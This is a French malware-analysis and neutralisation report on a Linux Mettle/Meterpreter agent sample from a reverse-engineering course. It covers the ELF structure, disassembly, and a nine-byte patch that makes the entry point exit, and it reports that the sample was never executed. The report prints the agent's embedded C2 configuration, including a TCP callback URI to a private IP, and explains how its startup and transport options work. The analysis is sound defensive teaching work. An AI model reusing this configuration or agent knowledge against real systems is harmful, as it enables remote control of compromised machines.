# Audit de reverse engineering et neutralisation de `mal.bin`

**Date : 28 septembre 2026 — Périmètre : les fichiers `mal.7z` et `mal.tmp` fournis.**

## 1. Résultat de l'analyse

L'échantillon est un **agent Linux x86-64 Mettle/Meterpreter**, configuré pour utiliser un transport TCP vers **`192.168.192.130:1337`**. Dans le parcours de démarrage et de configuration analysé, je n'ai identifié ni mot de passe à deviner, ni message de réussite, ni contrôle de licence à contourner. Le travail pertinent est donc l'analyse de son fonctionnement et sa **neutralisation**, conformément à la précision apportée pendant l'audit.

J'ai produit une copie dont **les neuf premiers octets exécutés sont remplacés par un arrêt immédiat**. Dans l'émulateur, ce nouveau point d'entrée atteint `exit(0)` en trois instructions, avant l'initialisation de Mettle. La copie livrée a été relue depuis son archive et son empreinte vérifiée.

**Portée de la preuve :** les vérifications exécutées sont une analyse statique et une émulation ciblée sous Unicorn. Je n'ai pas lancé l'agent original dans Linux, établi de connexion avec son serveur, ni effectué de capture réseau. La validation n'est donc pas un test d'exécution complet dans une VM Linux. Le reste du code de l'agent subsiste dans la copie : la neutralisation vise son démarrage normal par le point d'entrée ELF, pas un chargement personnalisé appelant directement une autre fonction.

## 2. Relation entre les deux fichiers et préservation des originaux

Les fichiers fournis proviennent de :

```text
D:\TOM\Hack And Stuff\Codes Ecole\Cours-ING-3\Revserse\Seances\crackmes\
```

`mal.tmp` est un petit fichier texte UTF-8 de 97 octets, malgré son extension. Il contient :

```text
7z x mal.7z
password : test

attention : detecté par les AV, à décompresser sous VM linux
```

Il donne le mot de passe **de l'archive**, pas celui d'une éventuelle authentification du programme. J'ai traité son contenu comme une information sur l'échantillon, et non comme une suite de commandes à exécuter automatiquement.

La liste de l'archive, obtenue avec `7z l -slt -ptest mal.7z`, annonce un seul membre : `mal.bin`, de 1 121 480 octets. Les méthodes indiquées sont BCJ, LZMA2 et 7zAES. La date de modification annoncée pour ce membre est le 28 septembre 2025 ; ce champ d'archive ne prouve pas sa date de compilation.

| Élément | Taille | SHA-256 |
|---|---:|---|
| `mal.7z`, original | 433 249 octets | `240bf810ef00266208ee4a7f9e48a24f73a0f80d42d4849f41e0ccb1feb0d295` |
| `mal.tmp`, original | 97 octets | `cd9588761536e64ea8bdea1851c9b12b66e74bec34af6a69842e5b871a3571ce` |
| `mal.bin`, contenu original extrait | 1 121 480 octets | `8f0bdcaabfe1089e0ea169eefeb1795bc6ea7762fff2aab0aabc60c8804dd6e2` |
| `mal.neutralise.bin`, copie modifiée | 1 121 480 octets | `70175ce93ed3868708f977a6b7d7e71a35c0aada00082cc66b3be2aced4c893a` |

Les deux fichiers originaux ont été conservés. L'analyse reproductible extrait le membre par la sortie standard de 7-Zip et le traite en mémoire. Aucun antivirus n'a été désactivé, aucune exclusion n'a été ajoutée.

## 3. Méthode et outils réellement employés

J'ai suivi une progression qui permet de justifier chaque modification : identifier le format, relever les chaînes utiles, retrouver leurs références dans les instructions, reconstruire le chemin de démarrage, puis tester les hypothèses de modification.

| Outil | Utilisation pendant l'audit |
|---|---|
| 7-Zip 19.00 | Liste et extraction en mémoire du membre chiffré ; création de l'archive de la copie modifiée |
| Python 3.12 | Calculs d'empreintes, lecture des octets, scripts reproductibles |
| pyelftools 0.33 | En-têtes ELF, segments, sections, symboles et relocalisations |
| Capstone 5.0.9 | Désassemblage x86-64 des octets du fichier |
| Unicorn 2.1.4 | Émulation des fonctions de configuration et du point d'entrée modifié |

Ghidra, IDA et GDB n'ont pas été utilisés pendant cette exécution. Les noms de fonctions présentés ci-dessous proviennent de la table des symboles du fichier, et non de noms inventés par un décompilateur.

L'initialisation minimale nécessaire à l'émulation a été reconstruite : chargement des deux segments `PT_LOAD`, application des relocalisations, pile artificielle, heap simulée et TLS minimal de musl pour `errno`. Ce travail permet de faire tourner les instructions du parseur sans démarrer le système complet de l'agent.

## 4. Identification du binaire

Les premiers octets sont `7f 45 4c 46`, la signature ELF. Les en-têtes donnent :

| Propriété | Observation |
|---|---|
| Architecture | AMD64/x86-64, 64 bits, little-endian |
| Type ELF | `ET_DYN`, avec `DT_FLAGS_1 = 0x08000000` (`DF_1_PIE`) |
| Point d'entrée | `0x93BA`, symbole `_start` |
| Interpréteur ELF | Aucun segment `PT_INTERP` |
| Bibliothèques dynamiques requises | Aucune entrée `DT_NEEDED` |
| Bibliothèque C | Présence du runtime musl et de la chaîne `x86_64-linux-musl` |
| Symboles | 4 489 entrées dans `.symtab`, 8 dans `.dynsym` |
| Informations de débogage | Sections `.debug_info`, `.debug_line`, etc. présentes, sans garantie d'un source complet |

Ces éléments correspondent à un exécutable PIE avec bibliothèques incorporées et code de relocalisation au démarrage. **`ET_DYN` ne suffit donc pas à conclure qu'il s'agit seulement d'une bibliothèque `.so`.** Le point d'entrée conduit bien au runtime puis à `main`.

Plusieurs indices indépendants identifient Mettle :

- la chaîne `mettle` à `0xAEA80` ;
- les symboles `mettle`, `mettle_start`, `c2_add_transport_uri` et `tlv_register_stdapi` ;
- le chemin de compilation `/home/jenkins/agent/workspace/mettle_build_gem/mettle/mettle/src/main.c` ;
- les sources incorporées dans les chaînes, notamment `c2_http.c`, `coreapi.c` et `stdapi/sys/process.c` ;
- les options embarquées, dont un UUID, un GUID de session et une URI TCP.

Le [dépôt officiel Rapid7 Mettle](https://github.com/rapid7/mettle) décrit ce projet comme une implémentation native de Meterpreter. Il corrobore l'identification, sans prouver à lui seul la version exacte ni l'origine de ce fichier. Le code actuel du dépôt a évolué : **les adresses et les décisions de patch de cet audit sont fondées sur le fichier fourni**, pas sur une recompilation supposée identique.

## 5. Retrouver une adresse à partir d'une chaîne ou d'une variable

### 5.1 Trois notions à distinguer

Un **offset fichier** est la position d'un octet sur disque. Une **adresse virtuelle ELF** est celle portée par les symboles et le désassemblage avant ajout de la base de chargement. Une **adresse effective** est celle du processus après chargement.

Pour cet ELF, j'utilise les relations suivantes :

```text
adresse effective = base de chargement + adresse virtuelle ELF
offset fichier = p_offset + (adresse virtuelle ELF - p_vaddr)
```

La seconde formule s'applique à une adresse appartenant à la partie du segment qui possède effectivement des octets dans le fichier. Une variable dans `.bss` n'a pas nécessairement d'offset à modifier sur disque. Cette distinction découle de la [description des segments ELF](https://refspecs.linuxfoundation.org/elf/gabi4%2B/ch5.pheader.html).

Les deux segments chargeables du fichier sont :

| Segment | `p_offset` | `p_vaddr` | Taille fichier | Taille mémoire | Permissions déclarées |
|---|---:|---:|---:|---:|---|
| Code et données constantes | `0x000000` | `0x000000` | `0xDF0BC` | `0xDF0BC` | Lecture, exécution |
| Données modifiables et BSS | `0x0DF580` | `0x2DF580` | `0x4AF0` | `0x13250` | Lecture, écriture |

Dans le premier segment, adresse virtuelle et offset sont numériquement identiques. Dans le second, il faut soustraire `0x200000`. Cette différence est essentielle pour ne pas écrire au mauvais endroit.

### 5.2 La configuration embarquée

La recherche de chaînes révèle une ligne complète commençant par `mettle -U`. La table des symboles permet de la nommer : **`default_opts.7006`**, objet de **2 013 octets**, à l'adresse virtuelle **`0x2E31C0`**. Le suffixe `.7006` est un suffixe de symbole produit à la compilation ; il ne s'agit ni d'un port ni d'un identifiant métier.

Calcul de sa position dans le fichier :

```text
0x0DF580 + (0x2E31C0 - 0x2DF580) = 0x0E31C0
```

La référence depuis le code confirme que cette chaîne est utilisée. À `0x9B8D` :

```asm
00009b8d  48 8d 3d 2c 96 2d 00   lea rdi, [rip + 0x2d962c]
```

L'adressage relatif utilise le RIP **de l'instruction suivante**, soit `0x9B94` :

```text
0x9B94 + 0x2D962C = 0x2E31C0
```

On dispose ainsi d'une chaîne, d'un symbole et d'une référence machine concordants. C'est plus solide que de choisir une adresse uniquement parce qu'elle contient une IP intéressante.

### 5.3 Comment reconnaître les paramètres et les variables locales

Dans les fonctions x86-64 de ce programme, les premiers arguments entiers ou pointeurs passent par `RDI`, `RSI`, `RDX`, `RCX`, `R8`, puis `R9`. Les valeurs de retour passent par `RAX` ou `EAX` selon leur taille.

Dans `parse_cmdline`, le contexte Mettle reçu dans `RDX` est conservé dans `R13`. Pour l'option `-u`, le code récupère `optarg`, puis prépare `RDI` avec le contexte C2 et `RSI` avec la chaîne URI avant l'appel de `c2_add_transport_uri` à `0x9827`.

Pour une variable locale, je cherche ses écritures puis les branches qui la lisent. Exemple : à `0x9947`, `sete byte ptr [rsp + 0x16]` enregistre le booléen associé à `-b`. À `0x9AA0`, ce même octet est testé avant la partie qui peut appeler `start_service`. **`rsp + 0x16` n'est pas une adresse absolue stable** : sa signification vaut dans ce cadre de pile précis, après le prologue de `parse_cmdline`.

## 6. Configuration extraite et interprétation

La chaîne à l'offset `0xE31C0` est :

```text
mettle -U "vaiB0/oaK6u7ub2702Dq8A==" -G "AAAAAAAAAAAAAAAAAAAAAA==" -u "tcp://192.168.192.130:1337" -d "0" -o "" -b "0"
```

| Option | Valeur | Signification établie par le parseur |
|---|---|---|
| `-U` | `vaiB0/oaK6u7ub2702Dq8A==` | Identifiant du payload, transmis au setter UUID |
| `-G` | `AAAAAAAAAAAAAAAAAAAAAA==` | GUID de session ; le décodage Base64 produit 16 octets nuls |
| `-u` | `tcp://192.168.192.130:1337` | URI fournie à l'ajout de transport C2 |
| `-d` | `0` | Niveau de journalisation nul |
| `-o` | chaîne vide | Valeur d'option de sortie ; aucun démarrage du logger sur le chemin testé avec `-d 0` |
| `-b` | `0` | Booléen de passage en arrière-plan désactivé pour cette configuration |

L'UUID décodé vaut `bda881d3fa1a2babbbb9bdbbd360eaf0`. Le Base64 est ici un encodage d'identifiants, pas une protection de mot de passe.

`192.168.192.130` est une adresse privée. Cela est compatible avec un environnement de laboratoire, mais ne permet ni d'attribuer l'échantillon à une personne ni d'affirmer qu'un serveur y répond. **L'audit n'a pas contacté cette adresse.**

## 7. Reconstruction du démarrage et du comportement

Le chemin principal observé dans le désassemblage est :

```text
_start (0x93BA)
  -> _start_c (0x93D0), relocalisation/runtime
  -> main (0x925C)
       -> mettle (0x9F22), construction du contexte
       -> parse_default_args (0x9B7F)
            -> strncasecmp(..., "default_opts", 12)
            -> argv_split (0xA140)
            -> parse_cmdline (0x96C5)
                 -> UUID / GUID / ajout du transport TCP
       -> parse_cmdline pour les arguments du lancement normal
       -> mettle_start (0xA084)
            -> enregistrement des gestionnaires de commandes
            -> c2_start (0xA784)
            -> boucle d'événements
```

`main` ignore d'abord `SIGPIPE`, puis construit l'objet Mettle. Si cette allocation/initialisation échoue, il prend une branche d'erreur. Le test de `RAX` à `0x9294` n'est donc pas une vérification de mot de passe.

Une autre branche compare `argv[0]` avec `"m"`. Elle gère un mode de chargement dans lequel un descripteur de fichier est fourni au payload et converti en URI `fd://...`. Cette comparaison n'est pas non plus une authentification. Elle explique pourquoi supprimer seulement l'URI embarquée ne couvre pas tous les modes d'activation.

Le chemin normal traite la configuration par défaut puis les arguments du lancement. Ajouter des arguments à la commande peut donc encore déclencher la création de transports. Le setter `c2_add_transport_uri` ajoute un transport : il ne faut pas supposer qu'un nouvel argument `-u` efface automatiquement tous les précédents.

Dans `mettle_start`, l'appel situé à `0xA10B` déclenche `c2_start`. Cette fonction démarre un timer d'événements. Le callback `transport_cb` choisit le transport courant et appelle sa fonction de démarrage. Pour TCP, `tcp_transport_start` rejoint `network_client_start`. La connexion est donc organisée par la boucle d'événements, pas réalisée directement par la simple lecture de la chaîne IP.

Le binaire contient également des gestionnaires d'exécution de processus, de fichiers, de réseau, de mémoire et de chargement d'extensions. Leur présence établit des **capacités compilées** ; elle ne prouve pas que ces actions ont été utilisées sur cette machine.

Concernant la persistance, l'aide mentionne `-p`, mais le désassemblage de `start_service` est très court : si l'argument de persistance dans `ECX` n'est pas nul, il renvoie `-1` ; sinon il rejoint `fork_service`. On ne peut donc pas conclure, à partir de l'aide seule, qu'un mécanisme d'installation persistante fonctionne dans cette compilation. Avec `-b 0`, ce chemin n'est pas appelé dans le test de configuration.

## 8. Protections observées et faux indices à éviter

| Élément | Ce que les preuves permettent de dire |
|---|---|
| Chiffrement 7z | Protection du conteneur, ouverte avec le mot de passe fourni dans `mal.tmp` |
| Packing/obfuscation | Aucun besoin d'unpacker mis en évidence : code, chaînes et milliers de symboles sont accessibles directement |
| PIE/ASLR | Adresses à exprimer avec la base de chargement ; aucune preuve de la randomisation réelle d'une exécution Linux n'a été collectée |
| Pile non exécutable | `PT_GNU_STACK` est déclaré lecture/écriture, sans drapeau d'exécution |
| RELRO | Présence de `PT_GNU_RELRO`, sans affirmation d'un « Full RELRO » effectivement appliqué à l'exécution |
| Anti-débogage | Aucun mécanisme identifié sur le chemin étudié ; recherches `ptrace` et `TracerPid` sans résultat textuel, ce qui ne constitue pas une preuve universelle d'absence |
| Contrôle d'intégrité | Aucun contrôle observé avant le point d'entrée modifié dans ce fichier ; aucune conclusion sur un éventuel chargeur externe |
| Cryptographie | Bibliothèques et fonctions de chiffrement des échanges présentes ; elles ne constituent pas un challenge de mot de passe identifié |

La neutralisation ne nécessite ni exploit mémoire, ni contournement de NX, ni désactivation de l'ASLR. Une modification hors exécution agit sur les octets du fichier avant leur chargement ; le patch retenu ne dépend pas d'une adresse absolue de processus.

Un symbole pouvait induire en erreur : **`password.2232`**, à `0x2F0240`, taille 128 octets, dans la BSS. Ses trois références RIP-relatives trouvées, à `0x929D5`, `0x929F0` et `0x92A46`, appartiennent à **`getpass`**, une fonction de bibliothèque. Ce nom n'établit donc pas la présence d'un mot de passe secret du challenge. Il ne faut pas modifier cette zone au hasard ni confondre un tampon de saisie avec une valeur attendue.

## 9. Première modification étudiée : ignorer la configuration

### 9.1 Comprendre la condition avant de la changer

La fonction `parse_default_args` compare les 12 premiers caractères de la configuration avec le marqueur `default_opts`, sans tenir compte de la casse :

```asm
00009b8d  lea  rdi, [rip + 0x2d962c]   ; default_opts.7006
00009b98  mov  edx, 0xc                ; 12 caractères
00009b9d  call 0xa4300                 ; strncasecmp
00009ba2  test eax, eax
00009ba4  je   0x9bd8                  ; marqueur inchangé : sortir
...
00009bbd  call 0xa140                  ; argv_split
...
00009bd3  call 0x96c5                 ; parse_cmdline
00009bd8  add  rsp, 0x18
```

Reconstruction simplifiée de ce bloc :

```c
if (strncasecmp(default_opts, "default_opts", 12) != 0) {
    argv = argv_split(default_opts, NULL, &argc);
    if (argv != NULL)
        parse_cmdline(argc, argv, mettle_context, flags);
}
```

Dans l'échantillon, la chaîne commence par `mettle`, donc la comparaison n'est pas égale. En émulation, elle retourne **9** : le saut conditionnel n'est pas pris et la configuration est traitée. `test eax,eax` positionne notamment le drapeau ZF, puis `je` saute si ZF vaut 1. C'est la relation entre comparaison, drapeau et branche qui donne un sens au patch.

### 9.2 Modification d'une instruction

| Adresse virtuelle / offset | Avant | Après | Effet |
|---|---|---|---|
| `0x9BA4` | `74 32` : `je 0x9BD8` | `EB 32` : `jmp 0x9BD8` | Sortie systématique du parseur par défaut |

Seul l'opcode `74` est remplacé par `EB`. Le déplacement relatif `32` reste identique et la taille de deux octets est conservée. Calcul de la destination : `0x9BA6 + 0x32 = 0x9BD8`.

Il serait également possible, dans une session de débogage arrêtée juste avant `test eax,eax`, de mettre `EAX` à zéro pour tester temporairement cette branche. Cela modifierait le registre du processus, pas le fichier. Cette variante au débogueur est une explication de méthode ; elle n'a pas été exécutée pendant l'audit.

### 9.3 Modification d'une donnée

Une seconde expérience remplace seulement les **12 premiers octets** de `default_opts.7006` par `DEFAULT_OPTS`, à l'offset **`0xE31C0`**. Puisque la comparaison ignore la casse et s'arrête à 12 caractères, le reste du tampon n'a pas besoin d'être effacé pour ce test. La comparaison retourne alors zéro et la configuration est ignorée.

Ces deux variantes ont été testées séparément, uniquement dans la mémoire de l'émulateur. Elles ne sont pas cumulées avec le patch du fichier livré.

### 9.4 Pourquoi ces variantes ne suffisent pas

Elles suppriment le traitement de la configuration par défaut. Elles ne suppriment ni les arguments de lancement, ni le mode `fd://`, ni les fonctions de l'agent. Elles ne justifient donc pas de déclarer le programme entièrement neutralisé. Leur intérêt pédagogique est de montrer comment agir sur **le code** ou sur **la donnée qui commande une branche**, avec un résultat observé.

## 10. Neutralisation retenue : arrêt au point d'entrée

### 10.1 Choix de l'emplacement

L'en-tête ELF indique `e_entry = 0x93BA`. Cette adresse appartient au premier segment, où `p_offset = p_vaddr = 0`, donc l'offset à modifier est aussi **`0x93BA`**.

Le point d'entrée original commence par :

```asm
000093ba  48 31 ed                xor rbp, rbp
000093bd  48 89 e7                mov rdi, rsp
000093c0  48 8d 35 89 9a 2d 00   lea rsi, [rip + 0x2d9a89]
000093c7  48 83 e4 f0             and rsp, -16
000093cb  e8 00 00 00 00          call 0x93d0
```

L'emplacement est choisi avant le runtime, la lecture de configuration et la boucle réseau. Il n'y a pas de `PT_INTERP` à exécuter avant ce point pour un lancement autonome normal de cet ELF.

### 10.2 Octets écrits et effet exact

Les neuf octets à partir de `0x93BA` sont remplacés ainsi :

```text
Avant : 48 31 ED 48 89 E7 48 8D 35
Après : 31 FF B8 3C 00 00 00 0F 05
```

Le nouveau code est :

```asm
xor edi, edi     ; premier argument = 0 ; l'écriture 32 bits annule aussi le haut de RDI
mov eax, 60     ; numéro du syscall exit sur Linux x86-64
syscall         ; demande de terminaison
```

La [table officielle des appels système Linux x86-64](https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl) associe bien le numéro 60 à `exit`. Ce syscall termine le thread appelant ; dans le scénario visé, le démarrage autonome vient de commencer et aucun thread de l'agent n'a encore été créé.

Le patch est indépendant de la base de chargement : il ne contient aucune adresse absolue ni aucun appel à la libc. Il conserve la taille du fichier, les offsets et la valeur `e_entry` de l'en-tête. Il remplace neuf octets, dont le début d'une ancienne instruction `lea` ; les octets restants de cette ancienne instruction ne sont pas atteints lorsque `exit` termine normalement l'exécution.

Un simple `ret` au point d'entrée aurait été incorrect : contrairement à une fonction appelée avec `call`, `_start` ne reçoit pas une adresse de retour ordinaire sur sa pile. De même, sauter uniquement l'appel à `mettle_start` interviendrait après l'initialisation. L'arrêt au point d'entrée répond plus directement à l'objectif de neutralisation du lancement normal.

### 10.3 Garantie du script de modification

`neutraliser_mal.py` vérifie le SHA-256 de l'original et les octets attendus à l'offset ciblé, écrit une nouvelle copie, puis vérifie le SHA-256 du résultat relu. Il refuse un autre échantillon ou une destination qui existe déjà.

La copie livrée se trouve dans **`mal-neutralise.7z`**, membre **`mal.neutralise.bin`**, mot de passe **`test`**. Ce conteneur permet de conserver et transmettre le résultat de laboratoire ; il ne transforme pas les fonctions restantes en code inoffensif lorsqu'elles sont appelées par un autre chemin.

## 11. Vérifications effectivement exécutées

### 11.1 Délimitation de l'émulation

Le script `analyser_mal.py` exécute les instructions originales de `parse_default_args`, `strncasecmp`, `argv_split`, `getopt_long` et du parseur d'options. Les allocations sont remplacées par une heap simple contrôlée par le script. Un objet Mettle minimal fournit uniquement les champs nécessaires au parcours testé.

Les fonctions qui ajoutent réellement un transport ou installent des identifiants sont interceptées à leur entrée : leurs arguments sont enregistrés puis un retour simulé est effectué. **Le test prouve que le parseur demande l'ajout de cette URI ; il ne simule pas toute la pile TCP ni une session Meterpreter.** Les appels système ne sont jamais transmis à l'hôte. Le syscall `exit` est enregistré puis arrête l'émulation ; tout autre syscall rencontré provoque un échec explicite du test.

Les permissions de mémoire de l'émulateur servent à cette analyse fonctionnelle ; elles ne constituent pas un test d'application de NX ou RELRO par Linux. La base artificielle `0x01000000` permet de vérifier que les accès relatifs fonctionnent après relocalisation ; elle n'est pas une adresse de processus réellement observée sur la machine.

### 11.2 Résultats

| Test | Résultat obtenu | Interprétation |
|---|---|---|
| Configuration originale | 5 255 instructions instrumentées ; comparaison = 9 ; 13 arguments ; appel intercepté de `c2_add_transport_uri` avec `tcp://192.168.192.130:1337` | La configuration identifiée est effectivement parcourue par le code original |
| `JE` remplacé par `JMP` à `0x9BA4` | 76 instructions instrumentées ; aucun appel du parseur d'options | La branche modifiée ignore le bloc de configuration |
| Préfixe remplacé par `DEFAULT_OPTS` | 368 instructions instrumentées ; comparaison = 0 ; aucun appel du parseur d'options | La condition du marqueur suffit à éviter le traitement du tampon |
| Nouveau point d'entrée | 3 instructions ; syscall 60 ; premier argument 0 ; aucun syscall transmis à l'hôte | L'arrêt est atteint immédiatement sur le chemin modifié |
| Comparaison avant/après | Exactement 9 octets différents, de `0x93BA` à `0x93C2` ; taille inchangée | Aucun autre octet du fichier n'a été modifié |
| Relecture de l'archive livrée | SHA-256 du membre extrait égal à l'empreinte attendue de la copie modifiée | L'archive contient bien les octets validés |
| Source volontairement altérée | Modification refusée par le script | Le patch ne s'applique pas silencieusement à un autre contenu |

Les nombres d'instructions des trois tests de fonction incluent l'instrumentation de retour et les entrées de fonctions interceptées ; ils ne sont pas une mesure de temps ou de performance native.

Les résultats bruts sont dans `preuves/preuves.json`, `preuves/neutralisation.json` et `preuves/controles_complementaires.json`. Le désassemblage annoté des fonctions utilisées est dans `preuves/desassemblage.asm`.

## 12. Reproduire l'analyse

Les commandes suivantes sont prévues depuis un dossier de laboratoire Linux contenant les scripts et l'archive originale. Elles ne démarrent pas le binaire analysé.

```bash
python3 -m venv .venv
. .venv/bin/activate
python -m pip install capstone==5.0.9 pyelftools==0.33 unicorn==2.1.4

# Nécessite un exécutable 7z déjà disponible.
python analyser_mal.py mal.7z --sevenzip 7z --output preuves-reproduction

# Crée une nouvelle archive ; une destination existante est refusée.
python neutraliser_mal.py mal.7z mal-neutralise-reproduction.7z --sevenzip 7z
```

Sur Windows, les scripts acceptent également `--sevenzip "C:\Program Files\7-Zip\7z.exe"`. `neutraliser_mal.py` n'a pas besoin des trois bibliothèques d'analyse.

Pour examiner les mêmes points avec des outils Linux classiques, après extraction dans le laboratoire :

```bash
7z x -ptest mal.7z
sha256sum mal.bin
file mal.bin
readelf -h -l -S -s -d mal.bin
strings -a -t x mal.bin
objdump -d -M intel --disassemble=parse_default_args mal.bin
objdump -d -M intel --disassemble=main mal.bin
xxd -g 1 -s 0x93ba -l 24 mal.bin
```

Ces commandes sont proposées pour reproduction ; les outils réellement exécutés pendant cet audit sont ceux de la section 3. Il n'est pas nécessaire d'exécuter l'agent ou de se connecter à son C2 pour reproduire les preuves livrées.

## 13. Adresses à retenir

Toutes les adresses de cette table sont celles de cet échantillon précis. En mémoire, ajouter la base de chargement.

| Élément | Adresse virtuelle ELF | Offset fichier | Utilité |
|---|---:|---:|---|
| `main` | `0x925C` | `0x925C` | Comprendre l'ordre des opérations |
| `_start` / `e_entry` | `0x93BA` | `0x93BA` | Patch de neutralisation retenu |
| `_start_c` | `0x93D0` | `0x93D0` | Entrée du runtime |
| `parse_cmdline` | `0x96C5` | `0x96C5` | Identifier la signification des options |
| Appel d'ajout de transport pour `-u` | `0x9827` | `0x9827` | Observer l'URI passée dans `RSI` |
| `parse_default_args` | `0x9B7F` | `0x9B7F` | Suivre le traitement de la configuration |
| `test eax,eax` | `0x9BA2` | `0x9BA2` | Relier retour de comparaison et ZF |
| `je 0x9BD8` | `0x9BA4` | `0x9BA4` | Patch pédagogique `74` → `EB` |
| `mettle_start` | `0xA084` | `0xA084` | Démarrage des gestionnaires et de la boucle |
| `argv_split` | `0xA140` | `0xA140` | Découpage réel de la chaîne en 13 arguments |
| `c2_add_transport_uri` | `0xA546` | `0xA546` | Ajout d'un transport, intercepté dans les tests |
| `c2_start` | `0xA784` | `0xA784` | Activation du timer C2 |
| `default_opts.7006` | `0x2E31C0` | `0xE31C0` | Tampon de configuration de 2 013 octets |
| `_zlog_level` | `0x2E4360` | Aucun octet correspondant dans la BSS | Niveau de log observé à zéro |
| `password.2232` | `0x2F0240` | Aucun octet correspondant dans la BSS | Tampon de `getpass`, faux indice de mot de passe |

## 14. Livrables et limites finales

| Fichier | Contenu |
|---|---|
| `audit.md` | Démarche, interprétation, calculs d'adresses et limites |
| `mal-neutralise.7z` | Copie avec arrêt immédiat au point d'entrée ; mot de passe `test` |
| `neutraliser_mal.py` | Application reproductible et vérifiée du patch de neuf octets |
| `analyser_mal.py` | Extraction des métadonnées, désassemblage ciblé et quatre scénarios d'émulation |
| `preuves/` | Résultats bruts et instructions annotées |

Le résultat établi est une **neutralisation du lancement autonome normal**, avec preuve des octets modifiés et de leur comportement en émulation. Il ne s'agit ni d'une suppression de toutes les capacités de l'agent, ni d'une désinfection d'un système déjà compromis. Aucun élément fourni ne permet d'affirmer qu'une machine a effectivement été compromise par cet échantillon.

Le point central de la démarche est de ne pas modifier une variable ou un saut sur la seule base de son nom. Ici, la chaîne embarquée, son symbole, sa référence RIP-relative, le retour de comparaison, la branche et les arguments transmis concordent. Le patch final est choisi ensuite en fonction de l'objectif : empêcher le démarrage de l'agent, dès la première instruction.
